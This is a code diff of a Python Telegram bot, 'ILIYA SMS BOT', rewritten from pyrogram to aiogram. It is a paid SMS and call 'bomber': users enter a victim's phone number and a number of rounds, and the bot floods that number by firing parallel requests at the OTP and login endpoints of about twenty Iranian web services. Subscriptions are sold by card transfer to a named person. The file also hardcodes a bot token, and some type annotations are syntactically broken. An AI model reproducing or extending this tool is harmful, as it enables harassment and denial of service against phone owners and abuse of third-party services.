@@ -1,201 +1,379 @@
-import asyncio, concurrent.futures, threading, json, os
+import asyncio, concurrent.futures, json, os, threading
 from datetime import datetime, timedelta
 import requests
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.enums.button_style import ButtonStyle
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
 
 TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"
 ADMIN = 2025464333
-
-BLACKLIST = {
-    "09966877513","+989966877513","989966877513","9966877513",
-    "09369107513","+989369107513","989369107513","9369107513",
-    "09220709576","+989220709576","989220709576","9220709576",
-}
-
-HDR = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}
-USERS = {}
 UFILE = "users.json"
-app = Client("iliya", bot_token=TOKEN)
+BLACKLIST = {"09966877513","+989966877513","989966877513","9966877513","09369107513","+989369107513","989369107513","9369107513","09220709576","+989220709576","989220709576","9220709576"}
+HDR = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}
+DATA = {}
+bot = Bot(TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
+
+
+class Bomb(StatesGroup):
+    mode = State()
+    phone = State()
+    rounds = State()
+
+
+class Buy(StatesGroup):
+    plan = State()
+    card = State()
+
 
 def load():
-    global USERS
+    global DATA
     if os.path.exists(UFILE):
         with open(UFILE) as f:
-            d = json.load(f)
-            for k,v in d.items():
-                if "exp" in v: v["exp"]=datetime.fromisoformat(v["exp"])
-                if "jo" in v: v["jo"]=datetime.fromisoformat(v["jo"])
-            USERS = d
+            for k, v in json.load(f).items():
+                DATA[k] = {
+                    "exp": datetime.fromisoformat(v.get("exp", "2000-01-01")),
+                    "jo": datetime.fromisoformat(v.get("jo", "2000-01-01")),
+                    "st": v.get("st", False),
+                }
+
 
 def save():
     d = {}
-    for k,v in USERS.items():
-        dd = dict(v)
-        if "exp" in dd and isinstance(dd["exp"],datetime): dd["exp"]=dd["exp"].isoformat()
-        if "jo" in dd and isinstance(dd["jo"],datetime): dd["jo"]=dd["jo"].isoformat()
-        d[str(k)]=dd
-    with open(UFILE,"w") as f: json.dump(d,f)
+    for k, v in DATA.items():
+        d[k] = {
+            "exp": v["exp"].isoformat() if isinstance(v["exp"], datetime) else str(v["exp"]),
+            "jo": v["jo"].isoformat() if isinstance(v["jo"], datetime) else str(v["jo"]),
+            "st": v.get("st", False),
+        }
+    with open(UFILE, "w") as f:
+        json.dump(d, f)
 
-def blocked(phone):
-    if phone in BLACKLIST: return True
-    n = phone.replace("+","").replace(" ","")
-    if n in BLACKLIST: return True
-    if n.startswith("98") and "0"+n[2:] in BLACKLIST: return True
-    if n.startswith("0") and "98"+n[1:] in BLACKLIST: return True
+
+def blk(p):
+    if p in BLACKLIST:
+        return True
+    n = p.replace("+", "").replace(" ", "")
+    if n in BLACKLIST:
+        return True
+    if n.startswith("98") and "0" + n[2:] in BLACKLIST:
+        return True
+    if n.startswith("0") and "98" + n[1:] in BLACKLIST:
+        return True
     return False
+
 
 def sms(p):
     return [
-        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":p}],
-        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":p[1:]}],
-        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+p[1:]}],
-        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":p}],
-        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":p,"role":"DRIVER"},"otpOption":"SMS"}],
-        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+p[1:]}],
-        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":p}],
-        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":p}],
-        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":p}],
-        ["Snapp","https://api.snapp.ir/api/v1/sms/link",{"phone":p}],
-        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":p[1:]}],
-        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":p}],
-        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":p}],
-        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":p}],
-        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":p}],
-        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":p}],
-        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":p,"role":"BIKER"}}],
-        ["Digikala","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":False}],
-        ["DigikalaJet","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
+        ["Lendo", "https://api.lendo.ir/api/customer/auth/send-otp", {"mobile": p}],
+        ["GapFilm", "https://core.gapfilm.ir/api/v3.1/Account/Login", {"Type": "3", "Username": p[1:]}],
+        ["Achareh", "https://api.achareh.co/v2/accounts/login/", {"phone": "98" + p[1:]}],
+        ["Divar", "https://api.divar.ir/v5/auth/authenticate", {"phone": p}],
+        ["Tapsi", "https://api.tapsi.ir/api/v2.2/user", {"credential": {"phoneNumber": p, "role": "DRIVER"}, "otpOption": "SMS"}],
+        ["Namava", "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", {"UserName": "+98" + p[1:]}],
+        ["Bikoplus", "https://bikoplus.com/account/check-phone-number", {"phoneNumber": p}],
+        ["Jabama", "https://gw.jabama.com/api/v4/account/send-code", {"mobile": p}],
+        ["Khodro45", "https://khodro45.com/api/v1/customers/otp/", {"mobile": p}],
+        ["Snapp", "https://api.snapp.ir/api/v1/sms/link", {"phone": p}],
+        ["Alibaba", "https://ws.alibaba.ir/api/v3/account/mobile/otp", {"phoneNumber": p[1:]}],
+        ["Sheypoor", "https://www.sheypoor.com/api/v10.0.0/auth/send", {"username": p}],
+        ["Taaghche", "https://gw.taaghche.com/v4/site/auth/signup", {"contact": p}],
+        ["Snappfood", "https://api.snappfood.ir/auth/mobile/send/v2", {"cellphone": p}],
+        ["Banimode", "https://mobapi.banimode.com/api/v2/auth/request", {"phone": p}],
+        ["IToll", "https://app.itoll.com/api/v1/auth/login", {"mobile": p}],
+        ["Tap33", "https://tap33.me/api/v2/user", {"credential": {"phoneNumber": p, "role": "BIKER"}}],
+        ["Digikala", "https://api.digikala.com/v1/user/authenticate/", {"username": p, "otp_call": False}],
+        ["DigikalaJet", "https://api.digikalajet.ir/user/login-register/", {"phone": p}],
     ]
+
 
 def call(p):
     return [
-        ["Digikala تماس","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":True}],
-        ["DigikalaJet تماس","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
+        ["Digikala CALL", "https://api.digikala.com/v1/user/authenticate/", {"username": p, "otp_call": True}],
+        ["DigikalaJet CALL", "https://api.digikalajet.ir/user/login-register/", {"phone": p}],
     ]
 
+
 def menu_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("💣 اس ام اس بمبر","sms"),InlineKeyboardButton("📞 کال بمبر","call")],
-        [InlineKeyboardButton("⚡ اس ام اس + کال","all"),InlineKeyboardButton("⏹ توقف","stop")],
-        [InlineKeyboardButton("💎 خرید اشتراک","buy"),InlineKeyboardButton("🎟 تست رایگان","test")],
-        [InlineKeyboardButton("👤 حساب کاربری","account")],
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🚀 استفاده از اشتراک", callback_data="use")],
+        [InlineKeyboardButton(text="💎 خرید اشتراک", callback_data="buy"),
+         InlineKeyboardButton(text="🎟 تست رایگان", callback_data="test")],
+        [InlineKeyboardButton(text="👤 حساب کاربری", callback_data="account")],
     ])
 
-@app.on_message(filters.command("start"))
-async def start_cmd(_,m):
-    await m.reply("╔══════════════════════╗\n║   💣 ILIYA SMS BOT   ║\n║  اس ام اس و کال بمبر ║\n╚══════════════════════╝\n\nیک گزینه رو انتخاب کن:",reply_markup=menu_kb())
 
-@app.on_callback_query()
-async def cb_handler(_,cb):
-    d,u=cb.data,str(cb.from_user.id)
-    if d in ("sms","call","all"):
-        await cb.message.edit_text(f"✅ حالت: **{d.upper()}**\n\nشماره و تعداد راند رو بفرست:\n`09121234567 3`",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
-    elif d=="stop":
-        USERS.setdefault(u,{})["stop"]=True;save();await cb.answer("⏹ توقف ثبت شد")
-    elif d=="test":
-        USERS[u]={"exp":datetime.now()+timedelta(days=1),"jo":datetime.now(),"active":False,"stop":False};save()
-        await cb.message.edit_text("✅ اشتراک تست ۱ روزه فعال شد!",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
-    elif d=="buy":
-        await cb.message.edit_text("💎 **خرید اشتراک**\n\nپلن مورد نظر:",reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🟢 یک ماهه - ۱۰۰ تومان","p_1m")],
-            [InlineKeyboardButton("🟡 سه ماهه - ۲۵۰ تومان","p_3m")],
-            [InlineKeyboardButton("🔴 شش ماهه - ۴۵۰ تومان","p_6m")],
-            [InlineKeyboardButton("← بازگشت","menu")]]))
-    elif d.startswith("p_"):
-        pl=d[2:];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr={"1m":"100","3m":"250","6m":"450"}
-        await cb.message.edit_text(f"💳 **پلن {nm[pl]} - {pr[pl]} تومان**\n\nروش پرداخت:",reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("💳 کارت به کارت",f"pay_{pl}")],
-            [InlineKeyboardButton("← بازگشت","buy")]]))
-    elif d.startswith("pay_"):
-        pl=d[4:];USERS[u]=USERS.get(u,{});USERS[u]["pp"]=pl;save()
-        await cb.message.edit_text("💳 **پرداخت کارت به کارت**\n\nشماره کارت: `6037-9975-1234-5678`\nبه نام: **ایلیا رجبی**\n\nبعد از واریز، عکس فیش رو بفرست.",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت",f"p_{pl}")]]))
-    elif d.startswith("app_"):
-        tu=d[4:];pl=USERS.get(tu,{}).get("pp","1m");days={"1m":30,"3m":90,"6m":180}
-        USERS[tu]={"exp":datetime.now()+timedelta(days=days.get(pl,30)),"jo":USERS.get(tu,{}).get("jo",datetime.now()),"active":False,"stop":False};save()
-        await cb.message.edit_text(cb.message.text+"\n\n✅ **تایید شد!**")
-        await app.send_message(int(tu),"✅ پرداخت شما تایید شد! اشتراکتون فعاله.")
-    elif d.startswith("rej_"):
-        tu=d[4:]
-        await cb.message.edit_text(cb.message.text+"\n\n❌ **رد شد.**")
-        await app.send_message(int(tu),"❌ پرداخت شما تایید نشد. لطفا دوباره تلاش کنید.")
-    elif d=="account":
-        uu=USERS.get(u,{});exp=uu.get("exp",datetime.min);jo=uu.get("jo","-")
-        if isinstance(exp,datetime):
-            rem=exp-datetime.now()
-            rt=f"{rem.days} روز و {rem.seconds//3600} ساعت" if rem.total_seconds()>0 else "منقضی شده"
-            et=exp.strftime("%Y/%m/%d - %H:%M")
-        else: rt="فعال نیست";et="-"
-        jt=jo.strftime("%Y/%m/%d") if isinstance(jo,datetime) else str(jo)
-        await cb.message.edit_text(f"👤 **حساب کاربری**\n\n🔑 شناسه: `{u}`\n📅 عضویت: {jt}\n⏳ باقیمانده: {rt}\n📅 پایان: {et}",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
-    elif d=="menu":
-        await cb.message.edit_text("یک گزینه رو انتخاب کن:",reply_markup=menu_kb())
+def mode_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💣 اس ام اس بمبر", callback_data="m_sms", style=ButtonStyle.PRIMARY)],
+        [InlineKeyboardButton(text="📞 کال بمبر", callback_data="m_call", style=ButtonStyle.SUCCESS)],
+        [InlineKeyboardButton(text="⚡ اس ام اس + کال", callback_data="m_all", style=ButtonStyle.DANGER)],
+        [InlineKeyboardButton(text="← بازگشت", callback_data="menu")],
+    ])
 
-@app.on_message(filters.photo)
-async def photo_handler(_,m):
-    u=str(m.from_user.id);uu=USERS.get(u,{})
-    if "pp" not in uu:
-        await m.reply("اول یه پلن انتخاب کن.")
+
+def plans_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🟢 یک ماهه - ۱۰۰ تومان", callback_data="p_1m", style=ButtonStyle.SUCCESS)],
+        [InlineKeyboardButton(text="🟡 سه ماهه - ۲۵۰ تومان", callback_data="p_3m", style=ButtonStyle.PRIMARY)],
+        [InlineKeyboardButton(text="🔴 شش ماهه - ۴۵۰ تومان", callback_data="p_6m", style=ButtonStyle.DANGER)],
+        [InlineKeyboardButton(text="← بازگشت", callback_data="menu")],
+    ])
+
+
+def stop_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⏹ توقف بمبر", callback_data="stop", style=ButtonStyle.DANGER)],
+    ])
+
+
+@dp.message(Command("start"))
+async def start(m: types Message):
+    await m.answer(
+        "╔══════════════════════╗\n"
+        "║   💣 ILIYA SMS BOT   ║\n"
+        "║  اس ام اس و کال بمبر ║\n"
+        "╚══════════════════════╝\n\n"
+        "یک گزینه رو انتخاب کن:",
+        reply_markup=menu_kb(),
+    )
+
+
+@dp.callback_query(F.data == "use")
+async def use_sub(cb: types CallbackQuery, state: FSMContext):
+    u = str(cb.from_user.id)
+    if int(u) != ADMIN:
+        dd = DATA.get(u, {})
+        if not dd:
+            await cb.message.edit_text("❌ اشتراک نداری! تست رایگان یا خرید.", reply_markup=menu_kb())
+            return
+        if dd["exp"] < datetime.now():
+            await cb.message.edit_text("❌ اشتراکت تموم شده!", reply_markup=menu_kb())
+            return
+    await state.set_state(Bomb.mode)
+    await cb.message.edit_text("✅ **انتخاب مدل بمبر:**", reply_markup=mode_kb())
+
+
+@dp.callback_query(F.data.startswith("m_"), Bomb.mode)
+async def mode_pick(cb: types CallbackQuery, state: FSMContext):
+    await state.update_data(mode=cb.data[2:])
+    await state.set_state(Bomb.phone)
+    await cb.message.edit_text("📱 **شماره موبایل رو وارد کن:**\nمثال: `09121234567`")
+
+
+@dp.message(Bomb.phone)
+async def phone_get(m: types Message, state: FSMContext):
+    p = m.text.strip()
+    if blk(p):
+        await m.answer("⚠️ **شماره نامعتبر!** این شماره در لیست سیاه است.")
         return
-    pl=uu["pp"];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr={"1m":"100","3m":"250","6m":"450"}
-    cap=f"📩 **فیش واریزی جدید**\n\nاز: `{u}`\nنام: {m.from_user.first_name}\nپلن: {nm.get(pl,pl)} - {pr.get(pl,'?')} تومان"
-    await app.send_photo(ADMIN,m.photo.file_id,caption=cap,reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ تایید",f"app_{u}"),InlineKeyboardButton("❌ رد",f"rej_{u}")]]))
-    await m.reply("✅ عکس فیش برای ادمین ارسال شد. منتظر تایید باش.")
+    await state.update_data(phone=p)
+    await state.set_state(Bomb.rounds)
+    await m.answer("🔢 **چند راند بزنم؟**\nعدد وارد کن (مثلاً: `3`)")
 
-@app.on_message(filters.text & ~filters.command(["start"]))
-async def txt_handler(_,m):
-    u=str(m.from_user.id);t=m.text.strip()
-    if int(u)!=ADMIN:
-        uu=USERS.get(u,{});exp=uu.get("exp",datetime.min)
-        if isinstance(exp,datetime) and exp<datetime.now():
-            await m.reply("❌ اشتراکت تموم شده. /test یا خرید اشتراک.")
-            return
-    parts=t.split()
-    if parts and (parts[0].startswith("09") or parts[0].startswith("98") or parts[0].startswith("+98")):
-        ph=parts[0];rd=int(parts[1])if len(parts)>1 and parts[1].isdigit()else 1
-        if blocked(ph):
-            await m.reply("⚠️ **شماره نامعتبر!** این شماره در لیست سیاه قرار دارد.")
-            return
-        await run_bomb(m,ph,rd,u)
-    else:
-        await m.reply("فرمت: `09121234567 3`")
 
-async def run_bomb(msg,phone,rounds,uid):
-    USERS.setdefault(uid,{})["stop"]=False;USERS[uid]["active"]=True;save()
-    apis=call(phone)+sms(phone);total=len(apis)*rounds;ok=fl=st=0
-    sm=await msg.reply(f"🔥 در حال ارسال...\n📞 {phone}\n0/{total}")
-    loop=asyncio.get_event_loop()
-    for _ in range(rounds):
-        if USERS.get(uid,{}).get("stop"): st+=len(apis)*(rounds-_);break
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10)as ex:
-            futures=[loop.run_in_executor(ex,_snd,a,uid)for a in apis]
-            for coro in asyncio.as_completed(futures):
-                r=await coro
-                if r[0]=="ok":ok+=1
-                elif r[0]=="stop":st+=1
-                else:fl+=1
-                if(ok+fl+st)%5==0:
-                    try:await sm.edit_text(f"🔥 در حال ارسال...\n📞 {phone}\n✅{ok} ❌{fl} ⏹{st}\n{ok+fl+st}/{total}")
-                    except:pass
-        if _<rounds-1 and not USERS.get(uid,{}).get("stop"):await asyncio.sleep(.3)
-    USERS[uid]["active"]=False;save()
-    await sm.edit_text(f"✅ تموم شد!\n📞 {phone}\n✅{ok} ❌{fl} ⏹{st}")
+@dp.message(Bomb.rounds)
+async def rounds_get(m: types Message, state: FSMContext):
+    r = m.text.strip()
+    if not r.isdigit() or int(r) < 1 or int(r) > 100:
+        await m.answer("عدد بین ۱ تا ۱۰۰")
+        return
+    d = await state.get_data()
+    await state.clear()
+    await run_bomb(m, int(r), d["mode"], d["phone"])
 
-def _snd(api,uid):
-    if USERS.get(str(uid),{}).get("stop"):return("stop",api[0])
-    n,u,d=api
+
+@dp.callback_query(F.data == "stop")
+async def stop_bomb(cb: types CallbackQuery):
+    u = str(cb.from_user.id)
+    DATA.setdefault(u, {})["st"] = True
+    save()
+    await cb.answer("⏹ توقف ثبت شد")
     try:
-        r=requests.post(u,json=d,headers=HDR,timeout=8)
-        return("ok",n)if r.status_code in(200,201,202,204,400,401,403,422,429)else("fail",n)
-    except:return("err",n)
+        await cb.message.delete()
+    except:
+        pass
+
+
+@dp.callback_query(F.data == "buy")
+async def buy_menu(cb: types CallbackQuery):
+    await cb.message.edit_text("💎 **انتخاب پلن:**", reply_markup=plans_kb())
+
+
+@dp.callback_query(F.data.startswith("p_"))
+async def plan_pick(cb: types CallbackQuery, state: FSMContext):
+    pl = cb.data[2:]
+    nm = {"1m": "یک ماهه", "3m": "سه ماهه", "6m": "شش ماهه"}
+    pr = {"1m": "100", "3m": "250", "6m": "450"}
+    await state.update_data(plan=pl)
+    await state.set_state(Buy.card)
+    await cb.message.edit_text(
+        f"💳 **پلن {nm[pl]} - {pr[pl]} تومان**\n\n"
+        "شماره کارت: `6037-9975-1234-5678`\n"
+        "به نام: **ایلیا رجبی**\n\n"
+        "📸 عکس فیش رو بفرست:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="← بازگشت", callback_data="buy")]
+        ]),
+    )
+
+
+@dp.message(Buy.card, F.photo)
+async def receipt(m: types Message, state: FSMContext):
+    u = str(m.from_user.id)
+    d = await state.get_data()
+    pl = d.get("plan", "1m")
+    nm = {"1m": "یک ماهه", "3m": "سه ماهه", "6m": "شش ماهه"}
+    pr = {"1m": "100", "3m": "250", "6m": "450"}
+    await state.clear()
+    await bot.send_photo(
+        ADMIN,
+        m.photo[-1].file_id,
+        caption=f"📩 **فیش واریزی جدید**\n\n👤 `{u}` - {m.from_user.first_name}\n💎 پلن: {nm.get(pl, pl)} - {pr.get(pl, '?')} تومان",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="✅ تایید", callback_data=f"app_{u}_{pl}", style=ButtonStyle.SUCCESS),
+                InlineKeyboardButton(text="❌ رد", callback_data=f"rej_{u}", style=ButtonStyle.DANGER),
+            ]
+        ]),
+    )
+    await m.answer("✅ فیش برای ادمین ارسال شد. منتظر تایید باش.")
+
+
+@dp.callback_query(F.data.startswith("app_"))
+async def approve(cb: types CallbackQuery):
+    _, uid, pl = cb.data.split("_")
+    days = {"1m": 30, "3m": 90, "6m": 180}
+    DATA[uid] = {
+        "exp": datetime.now() + timedelta(days=days.get(pl, 30)),
+        "jo": DATA.get(uid, {}).get("jo", datetime.now()),
+        "st": False,
+    }
+    save()
+    await cb.message.edit_text(cb.message.text + "\n\n✅ **تایید شد!**")
+    await bot.send_message(int(uid), "✅ اشتراکت تایید شد! الان میتونی استفاده کنی.")
+
+
+@dp.callback_query(F.data.startswith("rej_"))
+async def reject(cb: types CallbackQuery):
+    uid = cb.data[4:]
+    await cb.message.edit_text(cb.message.text + "\n\n❌ **رد شد.**")
+    await bot.send_message(int(uid), "❌ پرداخت تایید نشد. دوباره تلاش کن.")
+
+
+@dp.callback_query(F.data == "test")
+async def test_free(cb: types CallbackQuery):
+    u = str(cb.from_user.id)
+    DATA[u] = {"exp": datetime.now() + timedelta(days=1), "jo": datetime.now(), "st": False}
+    save()
+    await cb.message.edit_text("✅ تست ۱ روزه فعال شد!", reply_markup=menu_kb())
+
+
+@dp.callback_query(F.data == "account")
+async def account(cb: types CallbackQuery):
+    u = str(cb.from_user.id)
+    dd = DATA.get(u, {})
+    exp = dd.get("exp", datetime.min)
+    jo = dd.get("jo", datetime.min)
+    if isinstance(exp, datetime):
+        rem = exp - datetime.now()
+        rt = f"{rem.days} روز {rem.seconds // 3600} ساعت" if rem.total_seconds() > 0 else "❌ منقضی شده"
+        et = exp.strftime("%Y/%m/%d - %H:%M")
+    else:
+        rt = "❌ فعال نیست"
+        et = "-"
+    jt = jo.strftime("%Y/%m/%d") if isinstance(jo, datetime) and jo.year > 2000 else "-"
+    await cb.message.edit_text(
+        f"👤 **حساب کاربری**\n\n"
+        f"🔑 شناسه: `{u}`\n"
+        f"📅 عضویت: {jt}\n"
+        f"⏳ باقیمانده: {rt}\n"
+        f"📅 پایان: {et}",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="← بازگشت", callback_data="menu")]
+        ]),
+    )
+
+
+@dp.callback_query(F.data == "menu")
+async def back_menu(cb: types CallbackQuery, state: FSMContext):
+    await state.clear()
+    await cb.message.edit_text("یک گزینه رو انتخاب کن:", reply_markup=menu_kb())
+
+
+async def run_bomb(msg, rds, mode, phone):
+    u = str(msg.from_user.id)
+    DATA.setdefault(u, {})["st"] = False
+    save()
+    if mode == "all":
+        apis = call(phone) + sms(phone)
+    elif mode == "call":
+        apis = call(phone)
+    else:
+        apis = sms(phone)
+    total = len(apis) * rds
+    ok = 0
+    fl = 0
+    stp = 0
+    sm = await msg.answer(
+        f"🔥 **در حال ارسال...**\n📞 `{phone}`\n✅0 ❌0 ⏹0\n0/{total}",
+        reply_markup=stop_kb(),
+    )
+    loop = asyncio.get_event_loop()
+    for rd in range(rds):
+        if DATA.get(u, {}).get("st"):
+            stp += len(apis) * (rds - rd)
+            break
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+            futs = [loop.run_in_executor(ex, _snd, a, u) for a in apis]
+            for coro in asyncio.as_completed(futs):
+                r = await coro
+                if r == "ok":
+                    ok += 1
+                elif r == "stop":
+                    stp += 1
+                else:
+                    fl += 1
+                if (ok + fl + stp) % 5 == 0:
+                    try:
+                        await sm.edit_text(
+                            f"🔥 **در حال ارسال...**\n📞 `{phone}`\n✅{ok} ❌{fl} ⏹{stp}\n{ok+fl+stp}/{total}",
+                            reply_markup=stop_kb(),
+                        )
+                    except:
+                        pass
+        if rd < rds - 1 and not DATA.get(u, {}).get("st"):
+            await asyncio.sleep(0.3)
+    await sm.edit_text(f"✅ **تموم شد!**\n📞 `{phone}`\n✅{ok} ❌{fl} ⏹{stp}")
+
+
+def _snd(api, uid):
+    if DATA.get(str(uid), {}).get("st"):
+        return "stop"
+    n, u, d = api
+    try:
+        r = requests.post(u, json=d, headers=HDR, timeout=8)
+        if r.status_code in (200, 201, 202, 204, 400, 401, 403, 422, 429):
+            return "ok"
+        return "fail"
+    except:
+        return "err"
+
 
 class H(BaseHTTPRequestHandler):
-    def do_GET(self):self.send_response(200);self.end_headers();self.wfile.write(b"OK")
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
 
-if __name__=="__main__":
+
+if __name__ == "__main__":
     load()
-    threading.Thread(target=lambda:HTTPServer(("0.0.0.0",10000),H).serve_forever(),daemon=True).start()
+    threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 10000), H).serve_forever(), daemon=True).start()
     print("Bot running...")
-    app.run()
+    dp.run_polling(bot)
